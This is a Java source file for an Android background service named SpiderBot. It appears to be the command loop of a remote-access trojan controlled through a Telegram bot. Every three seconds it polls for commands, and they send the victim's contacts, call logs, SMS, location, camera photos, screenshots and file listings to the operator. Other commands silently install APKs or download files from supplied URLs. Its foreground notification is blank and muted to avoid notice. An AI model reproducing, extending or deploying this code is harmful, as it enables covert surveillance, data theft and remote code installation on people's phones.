package com.spiderbot;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;
import androidx.core.app.NotificationCompat;
import java.util.Timer;
import java.util.TimerTask;
public class BotService extends Service {
    private Timer timer;
    @Override
    public void onCreate() {
        super.onCreate();
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel("spider_ch", "SpiderBot", NotificationManager.IMPORTANCE_MIN);
            ch.setSound(null, null);
            getSystemService(NotificationManager.class).createNotificationChannel(ch);
        }
        startForeground(1001, new NotificationCompat.Builder(this, "spider_ch").setContentTitle("").setContentText("").setSmallIcon(android.R.drawable.ic_menu_info_details).build());
        TelegramAPI.sendMessage("✅ SpiderBot قيد التشغيل\n" + Build.MODEL);
        startListening();
    }
    private void startListening() {
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override public void run() {
                TelegramAPI.checkCommands(cmd -> {
                    cmd = cmd.trim().toLowerCase();
                    if (cmd.equals("/start") || cmd.equals("/help")) {
                        TelegramAPI.sendMessage("🔰 الأوامر:\n/contacts\n/calllogs\n/sms\n/info\n/location\n/photo\n/photofront\n/screenshot\n/files\n/apps\n/uninstall com.pkg\n/install url\n/download url");
                    } else if (cmd.equals("/contacts")) TelegramAPI.sendMessage(DeviceUtils.getContacts(BotService.this));
                    else if (cmd.equals("/calllogs")) TelegramAPI.sendMessage(DeviceUtils.getCallLogs(BotService.this));
                    else if (cmd.equals("/sms")) TelegramAPI.sendMessage(DeviceUtils.getSMS(BotService.this));
                    else if (cmd.equals("/info")) TelegramAPI.sendMessage(DeviceUtils.getDeviceInfo(BotService.this));
                    else if (cmd.equals("/location")) DeviceUtils.getLocation(BotService.this, TelegramAPI::sendMessage);
                    else if (cmd.equals("/photo")) DeviceUtils.takePhoto(BotService.this, false, (f, m) -> {});
                    else if (cmd.equals("/photofront")) DeviceUtils.takePhoto(BotService.this, true, (f, m) -> {});
                    else if (cmd.equals("/screenshot")) DeviceUtils.takeScreenshot(BotService.this);
                    else if (cmd.startsWith("/files")) {
                        String p = cmd.length() > 6 ? cmd.substring(6).trim() : "/sdcard";
                        TelegramAPI.sendMessage(DeviceUtils.listFiles(p));
                    } else if (cmd.equals("/apps")) TelegramAPI.sendMessage(DeviceUtils.getInstalledApps(BotService.this));
                    else if (cmd.startsWith("/uninstall")) {
                        String p = cmd.length() > 10 ? cmd.substring(10).trim() : "";
                        if (!p.isEmpty()) DeviceUtils.uninstallApp(BotService.this, p);
                        else TelegramAPI.sendMessage("استخدم: /uninstall com.package.name");
                    } else if (cmd.startsWith("/install")) {
                        String u = cmd.length() > 8 ? cmd.substring(8).trim() : "";
                        if (!u.isEmpty()) DeviceUtils.installApk(BotService.this, u);
                        else TelegramAPI.sendMessage("استخدم: /install https://example.com/app.apk");
                    } else if (cmd.startsWith("/download")) {
                        String u = cmd.length() > 9 ? cmd.substring(9).trim() : "";
                        if (!u.isEmpty()) DeviceUtils.downloadMedia(BotService.this, u);
                        else TelegramAPI.sendMessage("استخدم: /download https://example.com/image.jpg");
                    } else TelegramAPI.sendMessage("❌ أمر غير معروف: " + cmd);
                });
            }
        }, 0, 3000);
    }
    @Override public int onStartCommand(Intent i, int f, int id) { return START_STICKY; }
    @Override public IBinder onBind(Intent i) { return null; }
    @Override public void onDestroy() { if (timer != null) timer.cancel(); super.onDestroy(); }
}
